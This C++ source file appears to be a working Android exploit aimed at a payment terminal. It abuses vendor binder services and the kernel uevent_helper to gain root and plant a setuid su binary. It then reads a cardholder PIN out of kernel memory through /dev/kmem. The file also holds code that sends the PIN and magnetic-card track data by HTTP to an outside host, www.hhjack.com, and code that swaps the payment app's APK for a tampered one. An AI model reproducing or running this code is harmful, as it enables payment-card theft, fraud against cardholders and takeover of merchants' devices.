#include <binder/Parcel.h>
#include <binder/IPCThreadState.h>
#include <binder/ProcessState.h>
#include <binder/IServiceManager.h>
#include <binder/IBinder.h>
#include <binder/IInterface.h>
#include <utils/Log.h>
#include <utils/String16.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/socket.h>
#include <unistd.h>


using namespace android;

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void copy(const char *from, const char *to)
{
    int fd1, fd2;
    char buf[0x1000];
    ssize_t r = 0;

    if ((fd1 = open(from, O_RDONLY)) < 0)
        die("[-] open");
    if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0666)) < 0)
        die("[-] open");
    for (;;) {
        r = read(fd1, buf, sizeof(buf));
        if (r < 0)
            die("[-] read");
        if (r == 0)
            break;
        if (write(fd2, buf, r) != r)
            die("[-] write");
    }

    close(fd1);
    close(fd2);
    sync(); sync();
}

void remount_system()
{
    Parcel data, reply;
    sp<IServiceManager> sm = defaultServiceManager();
    sp<IBinder> binder = sm->getService(String16("epay.sysmgr"));
    if(binder == NULL)
    {
        printf("fail to get service\n");
        return;
    }
    data.writeInt32(10);
    status_t st = binder->transact(13, data, &reply);
}

void root_write()
{
    Parcel data, reply;
    sp<IServiceManager> sm = defaultServiceManager();
    sp<IBinder> binder = sm->getService(String16("epay.sysmgrhelper"));
    if(binder == NULL)
    {
        printf("fail to get service\n");
        return;
    }
    char filename[] = "exp.ini";
    data.writeInt32(strlen(filename));
    data.write(filename, strlen(filename));
    status_t st = binder->transact(22, data, &reply);
}

void write_ini()
{
    char buff[] = {
        "storagepath=/sys/kernel/\n"
            "storagename=uevent_helper\n"
            "deleteheadflg=1\n"
            "right=777\n"
            "[specialfiledata]\n"
            "/var/.download/root"
    };
    FILE *fp = fopen("/var/.download/exp.ini", "wb");
    fwrite(buff, strlen(buff), 1, fp);
    fclose(fp);
    chmod("/var/.download/exp.ini", 0666);
}

int read_kernel(int offset, char *value, int len)
{
    int fd = open("/dev/kmem", O_RDWR);
    lseek(fd, offset, SEEK_SET);
    int n = read(fd, value, len);
    close(fd);
    return n;
}

int write_kernel(int offset, char *value, int len)
{
    int fd = open("/dev/kmem", O_RDWR);
    lseek(fd, offset, SEEK_SET);
    int n = write(fd, value, len);
    close(fd);
    return n;
}

void show_kallsyms()
{
    int fd = open("/proc/sys/kernel/kptr_restrict", O_RDWR);
    char value[] = "0";
    write(fd, value, 1);
    close(fd);
}

int read_sym(char *sym)
{
    FILE *fp = fopen("/proc/kallsyms","r");
    char line[0x1000];
    char *ptr;
    char *str;
    int addr_sym;
    int index;
    while((ptr = fgets(line, 512, fp)))
    {
        str = strtok(ptr, " ");
        addr_sym = strtoul(str, NULL, 16);
        index = 1;
        while(str) {
            str = strtok(NULL, " ");
            index++;
            if (index == 3)
            {
                if (strncmp(sym, str, strlen(sym)) == 0)
                {
                    printf("[*] %s found at 0x%08x\n", sym, addr_sym);
                    fclose(fp);
                    return addr_sym;
                }
                break;
            }
        }
    }
    return 0;
}

void http_get(char *password, char *trackinfo)
{
    char request[2048];
    char request_template[] = "GET /magcard.php?psw=%s&tf=%s HTTP/1.1\r\nHost: %s\r\n\r\n";
    char *hostname = "www.hhjack.com";
    int len;
    int sd;
    struct hostent *hostent;
    struct sockaddr_in sockaddr_in;
    unsigned short server_port = 80;

    len = snprintf(request, 2048, request_template, password, trackinfo, hostname);
    sd = socket(AF_INET, SOCK_STREAM, 0);
    hostent = gethostbyname(hostname);
    memcpy(&sockaddr_in.sin_addr, hostent->h_addr_list[0], hostent->h_length);
    sockaddr_in.sin_family = AF_INET;
    sockaddr_in.sin_port = htons(server_port);
    connect(sd, (struct sockaddr*)&sockaddr_in, sizeof(sockaddr_in));
    write(sd, request, len);
    close(sd);
}

void root_func()
{
    if(access("/system/xbin/su", F_OK)!=-1) 
    {
        char password[7];
        char trackinfo[500];
        memset(trackinfo, 0, 500);
        memset(password, 0, 7);
        int offset = read_sym("clrPin.25988");
        FILE *fp;
        fp  = fopen("/var/.download/password.txt", "wb");
        if(offset==0)
        {
            fprintf(fp, "error\n");
        }
        else
        {
            read_kernel(offset, password, 6);
            fprintf(fp, "%s\n", password);
        }
        fclose(fp);
        if(strlen(password)==6)
        {
            fp = fopen("/var/.download/track.txt", "rb");
            fread(trackinfo, 500, 1, fp);
            fclose(fp);
            http_get(password, trackinfo);
        }
    } 
    else 
    {
        copy("/var/.download/su", "/system/xbin/su");
        chmod("/system/xbin/su", 06777);
        show_kallsyms();

        char apkpath[200];
        memset(apkpath, 0, 200);
        FILE *fp = fopen("/var/.download/apkpath", "rb");
        fread(apkpath, 200, 1, fp);
        apkpath[strlen(apkpath)-1] = 0;
        fclose(fp);

        copy(apkpath, "/var/.download/pay.org.apk");
        copy("/var/.download/pay.apk", apkpath);
        chmod(apkpath, 0666);

        system("/system/bin/busybox killall com.lkl.cloudpos.payment"); 
    }
}

int main()
{
    if(geteuid() == 0)
    {
        root_func();
    }
    else
    {
        write_ini();
        root_write();
        remount_system();
        system("/system/bin/pm list package -f com.lkl.cloudpos.payment | /system/bin/busybox awk -F [:=] '{print $2}' > /var/.download/apkpath");
        chmod("/var/.download/apkpath", 0666);
    }
    return 0;
}
